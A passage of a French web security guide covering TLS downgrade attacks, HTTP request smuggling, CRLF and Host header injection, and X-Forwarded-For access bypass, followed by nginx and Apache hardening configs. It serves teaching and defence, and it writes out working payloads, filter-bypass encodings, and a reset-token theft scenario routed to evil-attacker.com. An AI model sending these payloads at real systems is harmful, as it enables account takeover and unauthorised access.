Ces attaques exploitent la phase de négociation de protocole pour forcer l'utilisation d'un
algorithme ou d'une version cryptographiquement faible.

```text
Chronologie des attaques majeures sur TLS/SSL :

POODLE (2014) — CVE-2014-3566
  Protocole ciblé : SSLv3 (CBC padding)
  Mécanisme : forcer un downgrade vers SSLv3, puis oracle sur le padding CBC
  → Déchiffrement de 1 octet de cookie par ~256 requêtes
  Correction : désactiver SSLv3 sur tous les serveurs

FREAK (2015) — CVE-2015-0204
  Protocole ciblé : TLS avec export-grade RSA (512 bits)
  Mécanisme : forcer la négociation d'une clé RSA de 512 bits (export US 1990s)
  → Factorisation de la clé en quelques heures sur CPU standard
  Correction : supprimer les ciphers RSA-EXPORT et DHE-EXPORT

LOGJAM (2015) — CVE-2015-4000
  Protocole ciblé : DHE avec paramètres de 512 bits
  Mécanisme : forcer un DHE-512, résoudre le logarithme discret avec PRECOMP
  → Même vulnérabilité de type que FREAK mais sur Diffie-Hellman
  Correction : paramètres DH ≥ 2048 bits, ou basculer sur ECDHE

BEAST (2011) — CVE-2011-3389
  Protocole ciblé : TLS 1.0 (CBC avec IV prévisible)
  Mécanisme : attaque chosen-plaintext sur le mode CBC de TLS 1.0
  Correction : désactiver TLS 1.0, utiliser RC4 (obsolète) ou TLS 1.1+

CRIME (2012) — CVE-2012-4929
  Protocole ciblé : TLS avec compression (DEFLATE)
  Mécanisme : oracle de compression — injection de texte connu, mesure de la taille
  → Déchiffrement du cookie de session caractère par caractère
  Correction : désactivation de la compression TLS (faite par défaut dans TLS 1.3)
```

```bash
# Test de vulnérabilité aux downgrade attacks (outil : testssl.sh)
./testssl.sh --protocols cible.com
# Résultats :
# SSLv2      not offered (OK)
# SSLv3      not offered (OK)
# TLS 1.0    not offered (OK)
# TLS 1.1    not offered (OK)
# TLS 1.2    offered (ATTENTION si seules des ciphers faibles)
# TLS 1.3    offered with final (OK)

./testssl.sh --vulnerable cible.com
# Teste POODLE, FREAK, LOGJAM, BEAST, CRIME, HEARTBLEED, etc.
```

!!! warning "Downgrade dance — TLS_FALLBACK_SCSV"
    Le mécanisme `TLS_FALLBACK_SCSV` (RFC 7507) prévient les downgrades en incluant une
    pseudo-suite de chiffrement dans le ClientHello lorsque le client tente une connexion en
    version réduite (après un premier échec). Si le serveur supporte une version supérieure,
    il **rejette** la connexion avec une alerte `inappropriate_fallback`. **Vérifier que ce
    mécanisme est actif** avant de conclure qu'un downgrade est impossible.

---

### Variante 3 : HTTP Request Smuggling (Désynchronisation HTTP)

Le Request Smuggling exploite les **divergences d'interprétation** des en-têtes `Content-Length`
(CL) et `Transfer-Encoding` (TE) entre un frontend (reverse proxy) et un backend, permettant
à un attaquant de "glisser" une requête parasite dans la connexion TCP partagée.

```text
Architecture typique vulnérable :

 Internet
    │
    ▼
┌──────────┐  TCP persistant  ┌──────────┐
│ Reverse  │ ───────────────► │ Backend  │
│  Proxy   │                  │  App     │
│ (nginx,  │ ◄─────────────── │ (Node,   │
│  HAProxy)│                  │  Flask...)│
└──────────┘                  └──────────┘

Problème : le proxy et le backend ne s'accordent pas sur OÙ se termine une requête
```

**CL.TE — Frontend lit Content-Length, Backend lit Transfer-Encoding :**

```http
POST / HTTP/1.1
Host: cible.com
Content-Length: 13
Transfer-Encoding: chunked

0\r\n
\r\n
SMUGGLED
```

```text
Interprétation par le Frontend (lit Content-Length: 13) :
  Corps = "0\r\n\r\nSMUGGLED" ← 13 octets, requête transmise intégralement au backend

Interprétation par le Backend (lit Transfer-Encoding: chunked) :
  Premier chunk : "0" → chunk de taille 0 = fin du message
  → La requête est : POST / HTTP/1.1... [corps vide]
  → "SMUGGLED" reste dans le buffer TCP et sera préfixé à la PROCHAINE requête
     d'un autre utilisateur

→ La prochaine requête d'un utilisateur innocent sera préfixée par "SMUGGLED",
  modifiant potentiellement sa méthode, ses en-têtes, ou son destination
```

**TE.CL — Frontend lit Transfer-Encoding, Backend lit Content-Length :**

```http
POST / HTTP/1.1
Host: cible.com
Content-Length: 3
Transfer-Encoding: chunked

8\r\n
SMUGGLED\r\n
0\r\n
\r\n
```

```text
Interprétation par le Frontend (lit TE: chunked) :
  Chunk 1 : 8 octets = "SMUGGLED"
  Chunk 2 : 0 = fin
  Requête complète transmise au backend

Interprétation par le Backend (lit Content-Length: 3) :
  Corps = "8\r\n" (3 octets)
  → "SMUGGLED\r\n0\r\n\r\n" reste en buffer — préfixe la prochaine requête
```

**H2.CL — HTTP/2 → HTTP/1.1 Desync (variante moderne) :**

```http
# Requête envoyée au frontend en HTTP/2
:method POST
:path /
:authority cible.com
content-length: 0

GET /admin HTTP/1.1
Host: cible.com
Content-Length: 10

x=1
```

```text
Le frontend HTTP/2 traduit en HTTP/1.1 vers le backend et injecte un Content-Length
arbitraire dans la requête traduite, créant une désynchronisation exploitable.
Les attaques H2.CL permettent souvent de contourner des contrôles d'accès (atteindre
/admin depuis une IP non autorisée via un "request tunnel").
```

```python
# Détection de Request Smuggling — exemple avec requests-smuggler (outil Python)
# Test CL.TE basique
import requests
from requests.models import PreparedRequest

# Construction d'une requête CL.TE de sonde
session = requests.Session()
req = PreparedRequest()
req.method = "POST"
req.url = "https://cible.com/"
req.headers = {
    "Host": "cible.com",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "6",
    "Transfer-Encoding": "chunked",
}
# "0\r\n\r\nX" = 6 octets (CL vue par le frontend)
req.body = b"0\r\n\r\nX"

resp = session.send(req, timeout=10)
# Observer un délai de réponse anormal ou une erreur 400 du backend →
# indicateur que la sonde a atteint le buffer du backend
```

!!! tip "Détection et remédiation du Request Smuggling"
    - **Normaliser** `Transfer-Encoding` et `Content-Length` au niveau du reverse proxy —
      si les deux sont présents, rejeter la requête avec `400 Bad Request`.
    - **Utiliser HTTP/2 de bout en bout** (frontend et backend) — HTTP/2 résout
      intrinsèquement le problème car il n'y a pas d'ambiguïté CL/TE.
    - **Activer la journalisation** des requêtes malformées au niveau WAF pour détecter
      les sondes de Request Smuggling.

---

### Variante 4 : Exploitation des en-têtes — Injection

#### 4.a CRLF Injection

La séquence `\r\n` (Carriage Return + Line Feed, encodée `%0d%0a`) est le délimiteur de
champ dans le protocole HTTP. Son injection dans un paramètre reflété dans les en-têtes de
réponse permet l'injection d'en-têtes arbitraires ou le fractionnement de réponse.

```http
# Requête vulnérable — le paramètre "location" est reflété dans l'en-tête Location
GET /redirect?url=https://example.com%0d%0aSet-Cookie:%20session=hijacked%3b%20HttpOnly HTTP/1.1
Host: cible.com
```

```http
# Réponse générée par le serveur vulnérable
HTTP/1.1 302 Found
Location: https://example.com
Set-Cookie: session=hijacked; HttpOnly   ← EN-TÊTE INJECTÉ par l'attaquant
Content-Length: 0
```

```text
Impact de la CRLF Injection :
  - Injection de cookies arbitraires (fixation de session)
  - Injection de réponse complète (HTTP Response Splitting)
  - XSS via injection de Content-Type ou body HTML
  - Contournement de CSP en injectant une politique permissive
  - Phishing via injection de corps de réponse

Contournement de filtres courants :
  %0d%0a  → \r\n   (encodage URL standard)
  %0D%0A  → même chose (majuscules)
  %E5%98%8A%E5%98%8D → séquence UTF-8 multi-octets décodée en \r\n par certains parseurs
  \r\n    → insertion directe si l'encodage URL n'est pas appliqué
```

#### 4.b Host Header Injection

```http
# Requête forgée — l'en-tête Host est contrôlé par l'attaquant
POST /api/v1/password/reset HTTP/1.1
Host: evil-attacker.com
Content-Type: application/json

{"email": "victim@example.com"}
```

```text
Impact si le backend construit le lien de reset depuis l'en-tête Host :
  Le serveur envoie à victim@example.com un email contenant :
  "Cliquez ici : https://evil-attacker.com/reset?token=SECRET_TOKEN"

  La victime clique → le token de réinitialisation est transmis au serveur de l'attaquant
  → Account Takeover complet

Variantes :
  X-Forwarded-Host: evil-attacker.com   ← Peut être utilisé à la place de Host
  X-Host: evil-attacker.com
  X-Original-URL: evil-attacker.com
  X-Rewrite-URL: evil-attacker.com
```

```bash
# Test automatisé de Host Header Injection (dans Burp : option "Host injection")
curl -s -X POST https://cible.com/forgot-password \
     -H "Host: attacker.com" \
     -H "Content-Type: application/json" \
     -d '{"email":"test@example.com"}' -i
# Observer si la réponse ou les emails contiennent une référence à "attacker.com"
```

#### 4.c Bypass de contrôle d'accès via X-Forwarded-For

```http
# Certaines applications restreignent l'accès à des routes d'administration
# aux seules adresses IP internes (127.0.0.1, 10.0.0.0/8...)
# Si elles lisent l'IP depuis X-Forwarded-For plutôt que l'IP TCP réelle :

GET /admin/panel HTTP/1.1
Host: cible.com
X-Forwarded-For: 127.0.0.1    ← IP interne fictive — contrôle d'accès bypassé
X-Real-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
```

!!! warning "X-Forwarded-For n'est pas une source d'IP de confiance"
    `X-Forwarded-For` peut être forgé par n'importe quel client. Il n'est fiable
    que s'il est **ajouté ou restreint par un proxy de confiance connu**. Pour les
    contrôles d'accès basés sur l'IP, toujours utiliser l'**adresse IP de la connexion
    TCP** (socket source), jamais un en-tête HTTP. Si un reverse proxy est devant le
    serveur, configurer ce dernier pour n'accepter `X-Forwarded-For` que depuis l'IP
    du proxy de confiance.

---

## 6. Remédiation & Hardening

### 6.1 En-têtes de sécurité HTTP obligatoires

```http
# Configuration complète des en-têtes de sécurité recommandés (2026)

# Force HTTPS pour un an, tous sous-domaines inclus, préchargé dans les navigateurs
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Politique de sécurité du contenu — prévient XSS et injection de ressources
Content-Security-Policy: default-src 'self'; \
  script-src 'self' https://cdn.trusted.com; \
  style-src 'self' 'unsafe-inline'; \
  img-src 'self' data: https:; \
  font-src 'self' https://fonts.gstatic.com; \
  connect-src 'self' https://api.example.com; \
  frame-ancestors 'none'; \
  base-uri 'self'; \
  form-action 'self'; \
  upgrade-insecure-requests

# Interdit le chargement de la page dans un iframe (anti-clickjacking)
X-Frame-Options: DENY
# Note : remplacé par CSP frame-ancestors, mais maintenir les deux pour compat.

# Interdit le MIME type sniffing par le navigateur (anti-MIME confusion)
X-Content-Type-Options: nosniff

# Contrôle l'en-tête Referer envoyé lors des navigations inter-domaines
Referrer-Policy: strict-origin-when-cross-origin
# Options : no-referrer | no-referrer-when-downgrade | strict-origin | strict-origin-when-cross-origin

# Désactive les fonctionnalités navigateur non nécessaires
Permissions-Policy: geolocation=(), camera=(), microphone=(), payment=(), usb=()

# Activation CORS stricte (uniquement si API publique)
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Headers: Authorization, Content-Type, X-Requested-With
Access-Control-Max-Age: 3600

# Désactivation de l'en-tête Server (supprime la fingerprint du serveur)
Server: (à supprimer ou remplacer par une valeur générique)
```

!!! tip "Tester sa politique CSP"
    Utiliser [report-uri.com](https://report-uri.com) ou [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com)
    pour évaluer la robustesse d'une politique CSP. Une directive `script-src 'unsafe-inline'`
    ou `script-src *` rend la CSP quasi-inefficace contre XSS.

### 6.2 Hardening TLS — Configuration nginx

```nginx
# /etc/nginx/conf.d/ssl-hardening.conf — Configuration TLS durcie (2026)

server {
    listen 443 ssl http2;
    server_name api.example.com;

    # ── Certificats ──────────────────────────────────────────────────────────
    ssl_certificate     /etc/ssl/certs/api.example.com.fullchain.pem;
    ssl_certificate_key /etc/ssl/private/api.example.com.key;

    # ── Protocoles — TLS 1.2 minimum, TLS 1.3 recommandé ───────────────────
    ssl_protocols TLSv1.2 TLSv1.3;

    # ── Suites de chiffrement ────────────────────────────────────────────────
    # TLS 1.3 : suites automatiquement gérées par OpenSSL (AES-GCM, ChaCha20)
    # TLS 1.2 : uniquement ECDHE + AEAD
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:\
                ECDHE-RSA-AES128-GCM-SHA256:\
                ECDHE-ECDSA-AES256-GCM-SHA384:\
                ECDHE-RSA-AES256-GCM-SHA384:\
                ECDHE-ECDSA-CHACHA20-POLY1305:\
                ECDHE-RSA-CHACHA20-POLY1305:\
                DHE-RSA-AES128-GCM-SHA256;
    ssl_prefer_server_ciphers off;  # TLS 1.3 : laisser le client choisir

    # ── Sessions TLS ─────────────────────────────────────────────────────────
    ssl_session_timeout 1d;
    ssl_session_cache shared:SSL:10m;  # ~40 000 sessions
    ssl_session_tickets off;           # Désactiver si PFS stricte requise

    # ── OCSP Stapling ────────────────────────────────────────────────────────
    ssl_stapling on;
    ssl_stapling_verify on;
    ssl_trusted_certificate /etc/ssl/certs/intermediate-chain.pem;
    resolver 1.1.1.1 8.8.8.8 valid=300s;
    resolver_timeout 5s;

    # ── Courbes elliptiques ──────────────────────────────────────────────────
    ssl_ecdh_curve X25519:secp384r1:secp256r1;

    # ── Paramètres DH (pour DHE en TLS 1.2) ─────────────────────────────────
    ssl_dhparam /etc/ssl/dhparam-4096.pem;  # openssl dhparam -out dhparam-4096.pem 4096

    # ── En-têtes de sécurité ─────────────────────────────────────────────────
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Content-Security-Policy "default-src 'self'" always;
    add_header Permissions-Policy "geolocation=(), camera=()" always;

    # ── Suppression des informations de version ──────────────────────────────
    server_tokens off;  # Masque "nginx/1.26.0" dans les en-têtes et pages d'erreur

    # ── Désactivation de TRACE ───────────────────────────────────────────────
    # Nginx ne supporte pas TRACE nativement, mais sécuriser par précaution :
    if ($request_method = TRACE) { return 405; }

    # ── Protection contre le Request Smuggling ───────────────────────────────
    # Rejeter les requêtes avec Transfer-Encoding et Content-Length simultanés
    # (configurer selon les capacités du module nginx utilisé)
}

# Redirection HTTP → HTTPS (avec suppression de tous les cookies non-Secure)
server {
    listen 80;
    server_name api.example.com;
    return 301 https://$host$request_uri;
}
```

### 6.3 Hardening TLS — Configuration Apache

```apache
# /etc/apache2/sites-enabled/api.example.com.conf

<VirtualHost *:443>
    ServerName api.example.com

    # ── Certificats ──────────────────────────────────────────────────────────
    SSLCertificateFile    /etc/ssl/certs/api.example.com.crt
    SSLCertificateKeyFile /etc/ssl/private/api.example.com.key
    SSLCertificateChainFile /etc/ssl/certs/intermediate.crt

    # ── Moteur SSL et protocoles ─────────────────────────────────────────────
    SSLEngine on
    SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1  # TLS 1.2+ uniquement

    # ── Suites de chiffrement ────────────────────────────────────────────────
    SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:\
                   ECDHE-RSA-AES128-GCM-SHA256:\
                   ECDHE-ECDSA-AES256-GCM-SHA384:\
                   ECDHE-RSA-AES256-GCM-SHA384:\
                   ECDHE-ECDSA-CHACHA20-POLY1305:\
                   ECDHE-RSA-CHACHA20-POLY1305
    SSLHonorCipherOrder off

    # ── OCSP Stapling ────────────────────────────────────────────────────────
    SSLUseStapling on
    SSLStaplingCache "shmcb:/var/run/ocsp(128000)"

    # ── Désactivation de TRACE ───────────────────────────────────────────────
    TraceEnable off

    # ── En-têtes de sécurité ─────────────────────────────────────────────────
    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
    Header always set X-Frame-Options "DENY"
    Header always set X-Content-Type-Options "nosniff"
    Header always set Referrer-Policy "strict-origin-when-cross-origin"
    Header always set Content-Security-Policy "default-src 'self'"

    # ── Suppression des tokens de version ────────────────────────────────────
    ServerTokens Prod       # "Apache" uniquement, sans version
    ServerSignature Off     # Pas de signature dans les pages d'erreur
</VirtualHost>

<VirtualHost *:80>
    ServerName api.example.com
    Redirect permanent / https://api.example.com/
</VirtualHost>
```

### 6.4 Checklist de validation

!!! tip "Checklist de hardening HTTP/HTTPS"
    **Protocoles et Chiffrement :**
    - [ ] SSLv2, SSLv3, TLS 1.0, TLS 1.1 désactivés
    - [ ] TLS 1.2 et TLS 1.3 activés uniquement
    - [ ] Suites de chiffrement AEAD uniquement (AES-GCM, ChaCha20-Poly1305)
    - [ ] ECDHE utilisé pour l'échange de clés (PFS garantie)
    - [ ] Paramètres DH ≥ 2048 bits (ou ECDHE exclusif)
    - [ ] OCSP Stapling activé et fonctionnel
    - [ ] Certificat valide, non expiré, chaîne complète fournie

    **En-têtes de sécurité :**
    - [ ] `Strict-Transport-Security` avec `includeSubDomains` et `preload`
    - [ ] `Content-Security-Policy` définie et testée
    - [ ] `X-Frame-Options: DENY` ou `frame-ancestors 'none'` dans CSP
    - [ ] `X-Content-Type-Options: nosniff`
    - [ ] `Referrer-Policy` configurée
    - [ ] `Permissions-Policy` restrictive

    **Cookies :**
    - [ ] Tous les cookies de session avec `HttpOnly` + `Secure` + `SameSite=Strict`
    - [ ] Préfixes `__Host-` ou `__Secure-` sur les cookies critiques

    **Serveur et Application :**
    - [ ] `TraceEnable off` / méthode TRACE bloquée
    - [ ] En-têtes `Server:` et `X-Powered-By:` supprimés ou anonymisés
    - [ ] Domaine de base utilisé pour les liens d'email (jamais depuis `Host` header)
    - [ ] `X-Forwarded-For` non utilisé pour contrôles d'accès IP
    - [ ] Request Smuggling : normalisation CL/TE au niveau reverse proxy
    - [ ] Score SSL Labs ≥ A+

---

## 7. Références & Cheat Sheets

### RFCs fondamentaux

| RFC | Titre | Sujet |
|---|---|---|
| **RFC 9110** (2022) | HTTP Semantics | Méthodes, codes de statut, en-têtes, cache |
| **RFC 9111** (2022) | HTTP Caching | Directives de cache, Cache-Control |
| **RFC 9112** (2022) | HTTP/1.1 | Syntaxe de message HTTP/1.1 |
| **RFC 7540** (2015) | HTTP/2 | Framing binaire, multiplexage, HPACK |
| **RFC 9114** (2022) | HTTP/3 | HTTP sur QUIC |
| **RFC 9000** (2021) | QUIC | Protocole de transport QUIC |
| **RFC 8446** (2018) | TLS 1.3 | Handshake TLS 1.3, cipher suites, 0-RTT |
| **RFC 5246** (2008) | TLS 1.2 | Référence TLS 1.2 (obsolète en production) |
| **RFC 7507** (2015) | TLS Fallback SCSV | Protection contre les downgrades forcés |
| **RFC 6797** (2012) | HSTS | HTTP Strict Transport Security |
| **RFC 6962** (2013) | CT Logs | Certificate Transparency |
| **RFC 4648** (2006) | Base64 | Encodage Base64 (Basic Auth) |

### Ressources pratiques

| Ressource | Contenu | URL |
|---|---|---|
| **SSL Labs — Test SSL** | Analyse complète TLS d'un serveur avec note A à F | https://www.ssllabs.com/ssltest/ |
| **SSL Labs — Best Practices** | Configuration TLS recommandée, suites de chiffrement | https://github.com/ssllabs/research/wiki |
| **OWASP TLS Cheat Sheet** | Transport Layer Security best practices | https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html |
| **OWASP HTTP Headers Cheat Sheet** | En-têtes de sécurité — référence complète | https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html |
| **OWASP Request Smuggling** | Technique, détection et remédiation | https://owasp.org/www-community/attacks/HTTP_Request_Smuggling |
| **PortSwigger — Request Smuggling** | Labs interactifs, variantes CL.TE / TE.CL / H2 | https://portswigger.net/web-security/request-smuggling |
| **testssl.sh** | Script d'audit TLS complet en ligne de commande | https://testssl.sh |
| **Mozilla SSL Config Generator** | Génération de config nginx/Apache/HAProxy sécurisée | https://ssl-config.mozilla.org |
| **securityheaders.com** | Analyse des en-têtes de sécurité HTTP d'un site | https://securityheaders.com |
| **crt.sh** | Recherche dans les Certificate Transparency logs | https://crt.sh |
| **JA3 / JA4 Reference** | Fingerprints TLS connus par outil et version | https://github.com/salesforce/ja3 |
| **HSTS Preload List** | Soumission pour le préchargement HSTS | https://hstspreload.org |
